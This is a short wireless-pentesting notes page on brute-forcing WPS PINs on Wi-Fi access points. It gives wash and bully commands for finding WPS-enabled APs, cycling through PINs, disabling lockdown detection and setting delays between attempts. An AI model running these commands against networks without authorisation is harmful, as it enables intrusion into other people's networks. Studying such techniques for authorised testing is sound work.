# WPS

## Tools for cracking WPS

* Reaver / Wash
* Bully

To be able to attack WPS, you must be sure the target AP has WPS enabled.

You can use the Reaver package to check:

`wash -i wlan0mon` - checks if the AP has WPS enabled.

`bully -b <AP_bssid> wlan0mon` - bully starts trying every pin combination in a randomized order.

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

`bully -b <AP_bssid> -L wlan0mon` - "-L" disables lockdown detection. But not recommended.

You could add a delay to reduce the number of trial per seconds. `bully -b <AP_bssid> -1 <seconds> -2 <seconds> wlan0mon` - where "-1" controls the delay in the first phase of the attack (1st half of the PIN) and the "-2" option sets the delay value for the second phase. Values of 60 seconds or more are recommended for most APs.
